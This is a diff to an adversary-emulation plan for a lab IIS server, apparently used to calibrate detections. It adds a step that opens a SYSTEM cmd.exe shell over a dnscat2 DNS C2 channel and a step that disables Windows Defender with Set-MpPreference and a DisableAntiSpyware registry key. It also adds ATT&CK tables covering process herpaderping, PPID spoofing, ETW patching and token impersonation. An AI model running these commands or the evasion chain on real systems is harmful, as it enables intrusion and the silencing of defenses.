@@ -194,6 +194,25 @@ dnscat2 establishes a DNS C2 session from the IIS host.
     nt authority\system
     ```
 
+- ☣️ Open an interactive `cmd.exe` shell from the SYSTEM dnscat2 session
+
+  ```text
+  command (iis-server) 2> shell
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    New session created: <session-id-3>
+    ```
+
+  ```text
+  dnscat2> session -i <session-id-3>
+  sh (iis-server) 3>
+  ```
+
+  > **Note:** `shell` spawns `cmd.exe` as a child of the `RuntimeBroker.exe` ghost process under `NT AUTHORITY\SYSTEM`. All subsequent commands in Phases 2–5 that run from the IIS01 SYSTEM session execute within this `cmd.exe` child.
+
 ### Reference Tables
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
@@ -205,17 +224,94 @@ dnscat2 establishes a DNS C2 session from the IIS host.
 | Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `node.exe` reads `C:\Windows\Temp\CertEnrollSvc.b64` and writes decoded bytes to `C:\Windows\Temp\CertEnrollSvc.bin`, followed by `fs.renameSync` rename to `C:\Windows\Temp\CertEnrollSvc.exe` | Calibrated - Not Benign | `decode` command decodes base64 file to PE bytes using Node.js `Buffer` API via eval, then `rename` moves the staged `.bin` to `.exe` - no spawn | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py), [file_ops.py rename()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
 | Defense Evasion | T1562.006 | Impair Defenses: Indicator Blocking | Windows | `CertEnrollAgent.exe` patches `ntdll!EtwEventWrite` in its own process memory to `xor eax,eax; ret` after changing the code page protection, causing subsequent ETW writes from the loader process to return fake success | Not Calibrated - Not Benign | CWLHerpaderping tampers with ETW before entering the sensitive loader flow; accepted here as an explicit out-of-scope mapping exception because `T1562.006` is not part of the selected Scenario 1 technique set | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp PatchEtw()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
 | Execution | T1106 | Native API | Windows | `CertEnrollAgent.exe` resolves native NT APIs from `ntdll.dll`, builds indirect syscall stubs, and uses them for `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, and `NtCreateThreadEx` during the Herpaderping flow | Not Calibrated - Not Benign | CWLHerpaderping invokes the sensitive process-creation path through indirect syscalls; the loader also wraps those calls with stack spoofing, but the primary ATT&CK behavior here is native API / syscall execution | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp), [syscall.h](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/syscall.h), [StackSpoof.cpp](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/StackSpoof.cpp) | -
-| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | `CertEnrollSvc.exe` elevates its token to `NT AUTHORITY\SYSTEM` via named pipe impersonation | Calibrated - Not Benign | Step 3B: CertEnrollSvc uses `SeImpersonatePrivilege` to obtain SYSTEM token (file-based full chain); implementation details in [efspotato.md](../further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs) | -
+| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | Sysmon Event 1 on IIS01: `CertEnrollAgent.exe` spawned by `CertEnrollSvc.exe` (IIS APPPOOL\react.testlab.local); `CertEnrollAgent.exe` process token context shows `NT AUTHORITY\SYSTEM` — AppPool identity producing a SYSTEM-privileged child is the primary observable of the EfsPotato named-pipe token impersonation chain | Calibrated - Not Benign | Step 3B: CertEnrollSvc uses `SeImpersonatePrivilege` to obtain SYSTEM token (file-based full chain); implementation details in [efspotato.md](../further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs) | -
 | Privilege Escalation | T1134.002 | Access Token Manipulation: Create Process with Token | Windows | `CertEnrollSvc.exe` calls `CreateProcessAsUser` with the impersonated token; child process (`CertEnrollAgent.exe`) is created with `CREATE_NO_WINDOW` (`0x08000000`) | Not Calibrated - Not Benign | Step 3B: CertEnrollSvc spawns CertEnrollAgent as SYSTEM (file-based full chain); implementation details in [efspotato.md](../further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs) | -
-| Defense Evasion | T1055 | Process Injection | Windows | `CertEnrollAgent.exe` writes the payload to `%TEMP%\HD*.tmp`, creates a `SEC_IMAGE` section from that temp file, spawns a ghost process from the section with `NtCreateProcessEx`, and then overwrites the backing temp file after the in-memory image is already mapped | Calibrated - Not Benign | Step 3B: CWLHerpaderping performs process-herpaderping-style injection (file-based full chain): dnscat2 payload enters ghost process through image section, not via WriteProcessMemory; later remote writes used for metadata spoofing | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
+| Defense Evasion | T1055 | Process Injection | Windows | Sysmon Event 11 on IIS01: `CertEnrollAgent.exe` (NT AUTHORITY\SYSTEM) creates `%SystemRoot%\Temp\HD*.tmp`; Sysmon Event 1: `RuntimeBroker.exe` ghost spawned with `CertEnrollAgent.exe` as parent and no matching on-disk image at `C:\Windows\System32\RuntimeBroker.exe`; Sysmon Event 11: `HD*.tmp` content subsequently overwritten — characteristic Herpaderping file-write-then-overwrite sequence | Calibrated - Not Benign | Step 3B: CWLHerpaderping performs process-herpaderping-style injection (file-based full chain): dnscat2 payload enters ghost process through image section, not via WriteProcessMemory; later remote writes used for metadata spoofing | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
 | Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | `CertEnrollAgent.exe` spawns a ghost process with PPID pointing to `svchost.exe` or `wininit.exe` in Session 0 | Calibrated - Not Benign | Step 3B: CertEnrollAgent chooses Session 0 parent for ghost process (file-based full chain); implementation details in [process-herpaderping.md](../further-reading/process-herpaderping.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetNonJobParent()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
 | Defense Evasion | T1620 | Reflective Code Loading | Windows | `node.exe` spawns `CertEnrollAgent.exe` with stdin pipe containing PE file bytes (dnscat2.exe payload); no intermediate file creation on disk for the payload binary | Calibrated - Not Benign | Step 3A: CertEnrollAgent reflectively loads dnscat2 from stdin pipe (T1620 demo); payload read from base64 file, decoded in-memory by Node.js, piped via `spawnSync` stdin redirection — dnscat2.exe PE never written to disk, eliminating file artifacts | react.testlab.local | IIS APPPOOL\react.testlab.local | [CWLImplant.cpp GetPayloadBuffer()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp), [file_ops.py herpload()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
 | Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollAgent.exe` deletes `C:\ProgramData\CertCA.bin` from disk | Calibrated - Not Benign | Step 3B: CWLHerpaderping deletes dnscat2 payload file after loading to remove forensic evidence (file-based full chain); file deletion occurs in fallback mode when stdin is not redirected | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetPayloadBuffer()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
-| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `CertEnrollAgent.exe` builds spoofed process parameters with `ImagePathName = C:\Windows\System32\RuntimeBroker.exe`, causing the ghost process to present a legitimate Windows path while its mapped image is the dnscat2 payload | Calibrated - Not Benign | Step 3B: CWLHerpaderping makes ghost process resemble legitimate Windows component by assigning trusted image path (file-based full chain); masquerading outcome mapped separately from PEB rewrite under process argument spoofing | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
+| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | Sysmon Event 1 on IIS01: ghost process reports `ImageFileName = C:\Windows\System32\RuntimeBroker.exe`; EDR image verification: PE mapped in the ghost process address space does not match the on-disk hash of `C:\Windows\System32\RuntimeBroker.exe` — image path vs. mapped content mismatch is the Herpaderping masquerade artifact | Calibrated - Not Benign | Step 3B: CWLHerpaderping makes ghost process resemble legitimate Windows component by assigning trusted image path (file-based full chain); masquerading outcome mapped separately from PEB rewrite under process argument spoofing | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
 | Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | `RuntimeBroker.exe` (dnscat2 ghost process) issues a high volume of DNS queries containing encoded subdomain labels to `attacker.local` | Calibrated - Not Benign | Step 3B: dnscat2 C2 session established as SYSTEM via Herpaderping ghost process (file-based full chain); bootstrapped from react2shell session via eval detached spawn of CertEnrollSvc | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe) | -
 | Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | DNS query payloads are encrypted after dnscat2 session key negotiation | Not Calibrated - Not Benign | dnscat2 encrypts C2 session data; protocol details are covered in [dnscat2.md](../further-reading/dnscat2.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe) | -
-| Discovery | T1012 | Query Registry | Windows | `RuntimeBroker.exe` (dnscat2 ghost process) reads the `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer` registry key via `RegOpenKeyEx` API | Calibrated - Not Benign | Step 3B: dnscat2 enumerates TCP/IP interface GUIDs, reads NameServer/DhcpNameServer registry values to discover DNS resolver for C2 tunneling (file-based full chain) | react.testlab.local | NT AUTHORITY\SYSTEM | [getdns_windows.go getSystemDNS()](../../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | -
+| Discovery | T1012 | Query Registry | Windows | EDR registry access event on IIS01: `RuntimeBroker.exe` (dnscat2 ghost process, NT AUTHORITY\SYSTEM) reads `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer`; `RuntimeBroker.exe` (UWP process broker) reading TCP/IP DNS resolver configuration keys is anomalous | Calibrated - Not Benign | Step 3B: dnscat2 enumerates TCP/IP interface GUIDs, reads NameServer/DhcpNameServer registry values to discover DNS resolver for C2 tunneling (file-based full chain) | react.testlab.local | NT AUTHORITY\SYSTEM | [getdns_windows.go getSystemDNS()](../../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | -
 | Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Windows | `CertEnrollSvc.exe` spawns `CertEnrollAgent.exe` with `CREATE_NO_WINDOW` (`0x08000000`); dnscat2 executes without a console window | Calibrated - Not Benign | Step 3B: Escalation and C2 launch run without visible console windows (file-based full chain); implementation details in [efspotato.md](../further-reading/efspotato.md) and [dnscat2.md](../further-reading/dnscat2.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs), [dnscat2 build flags](../../resources/payloads/dnscat2/go-client) | -
-| Defense Evasion | T1564.010 | Hide Artifacts: Process Argument Spoofing | Windows | `CertEnrollAgent.exe` creates spoofed `RTL_USER_PROCESS_PARAMETERS`, writes them into the ghost process with `NtAllocateVirtualMemory` / `NtWriteVirtualMemory`, and patches `remotePEB->ProcessParameters` with `WriteProcessMemory` so subsequent inspection shows `RuntimeBroker.exe` metadata | Calibrated - Not Benign | Step 3B: CWLHerpaderping rewrites ghost process PEB metadata to hide true payload identity (file-based full chain); this row captures parameter/PEB spoofing mechanism separate from trusted name masquerading | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
+| Defense Evasion | T1564.010 | Hide Artifacts: Process Argument Spoofing | Windows | EDR cross-process memory write event on IIS01: `CertEnrollAgent.exe` (NT AUTHORITY\SYSTEM) calls `WriteProcessMemory` targeting the PEB `ProcessParameters` region of the `RuntimeBroker.exe` ghost process; the resulting ghost process reports command line and image path inconsistent with the on-disk `C:\Windows\System32\RuntimeBroker.exe` binary | Calibrated - Not Benign | Step 3B: CWLHerpaderping rewrites ghost process PEB metadata to hide true payload identity (file-based full chain); this row captures parameter/PEB spoofing mechanism separate from trusted name masquerading | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
 | Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertEnrollAgent.exe` resolves native API addresses via PEB walk and DJB2 EAT hash lookup instead of static imports | Not Calibrated - Not Benign | CWLHerpaderping uses hash-based API resolution; implementation details are covered in [process-herpaderping.md](../further-reading/process-herpaderping.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [api_hash.h](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/api_hash.h) | -
 | Defense Evasion | T1027.008 | Obfuscated Files or Information: Stripped Payloads | Windows | `dnscat2.exe` has its Go symbol table and DWARF debug information stripped; `CWLHerpaderping.exe` (deployed as `CertEnrollAgent.exe`) is a Visual C++ release build with no useful debug metadata exposed to responders | Not Calibrated - Not Benign | dnscat2 is compiled with Go release flags that omit symbol and DWARF debug information, while CWLHerpaderping is deployed as a release-built C++ loader renamed to `CertEnrollAgent.exe` | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe), [CWLHerpaderping.exe](../../resources/payloads/CWLHerpaderping/x64/Release/CWLHerpaderping.exe) | -
+| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | Sysmon Event 1 on IIS01: `cmd.exe` spawned as child of `RuntimeBroker.exe` ghost (dnscat2 SYSTEM parent); command line is `cmd.exe` with no arguments; parent image path is `C:\Windows\System32\RuntimeBroker.exe` | Calibrated - Not Benign | Step 1B: dnscat2 `shell` command spawns `cmd.exe` under the `RuntimeBroker.exe` ghost process as `NT AUTHORITY\SYSTEM`; all subsequent shell commands in Phases 2–5 from the IIS01 SYSTEM session execute within this `cmd.exe` child | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | -
+
+---
+
+> **Optional Step** — Execute before Phase 2 staging if Windows Defender is active on IIS01. Skip if Defender is absent, disabled by policy, or if suppressing AV detection would interfere with test objectives for this run. This step does not affect the Herpaderping ghost process or dnscat2 session established in Step 1.
+
+## Step 2 — Defense Evasion: Disable Windows Defender on IIS01 (Optional)
+
+### Voice Track
+
+With SYSTEM-level code execution established on IIS01, the attacker suppresses
+Windows Defender before the server is used as a staging hub for lateral movement
+tooling in Phases 2 and 3. Ransomware operators routinely perform this step on any
+compromised host that will receive significant payload staging — disabling real-time
+scanning prevents delivered binaries from being quarantined between upload and
+execution.
+
+Two complementary methods are applied from the SYSTEM dnscat2 shell. The PowerShell
+`Set-MpPreference` cmdlet immediately disables the three most impactful scanning
+components: real-time monitoring, behaviour monitoring, and script scanning. A
+parallel `reg add` write to `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` sets
+`DisableAntiSpyware` to `1` under the Group Policy enforcement path, persisting the
+disablement across reboots without requiring a service restart. Together the two
+methods match the dual-vector AV suppression sequence documented in LockBit Black
+and Conti pre-encryption playbooks.
+
+### Procedures
+
+- ☣️ From the IIS01 dnscat2 SYSTEM shell, disable Defender real-time, behaviour, and script scanning
+
+  ```text
+  C:\Windows\Temp> powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1"
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    (no output — Set-MpPreference applies settings silently)
+    ```
+
+  > **Note:** On Windows Server 2022 with Defender installed, the cmdlet completes
+  > silently and Windows Security Centre reflects the change immediately. If the lab
+  > Defender policy is managed via GPO from DC01, the GPO may override
+  > `Set-MpPreference` values on the next refresh — the `reg add` step below takes
+  > precedence when applied under the Policy path.
+
+- ☣️ Write the Group Policy Defender disable key to persist the setting across reboots
+
+  ```text
+  C:\Windows\Temp> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    The operation completed successfully.
+    ```
+
+- Verify the registry key was written
+
+  ```text
+  C:\Windows\Temp> reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender
+        DisableAntiSpyware    REG_DWORD    0x1
+    ```
+
+### Reference Tables
+
+| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
+| - | - | - | - | - | - | - | - | - | - | - |
+| Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools | Windows | PowerShell Script Block Log Event 4104 on IIS01: `Set-MpPreference -DisableRealtimeMonitoring 1; -DisableBehaviorMonitoring 1; -DisableScriptScanning 1` executed by `powershell.exe` (child of `RuntimeBroker.exe` ghost, NT AUTHORITY\SYSTEM) | Calibrated - Not Benign | `Set-MpPreference` disables Defender real-time, behaviour, and script scanning from the SYSTEM dnscat2 shell — immediate AV suppression before IIS01 is used as a lateral movement staging host in Phases 2 and 3 | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
+| Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools | Windows | Sysmon Event 1 on IIS01: `reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f` spawned from `RuntimeBroker.exe` ghost (NT AUTHORITY\SYSTEM); Sysmon Event 13: `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware` set to `0x1` | Calibrated - Not Benign | `reg add` writes `DisableAntiSpyware=1` under the Windows Defender Group Policy registry path — persists AV disablement across reboots via the policy enforcement path, separately from the `Set-MpPreference` runtime change | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
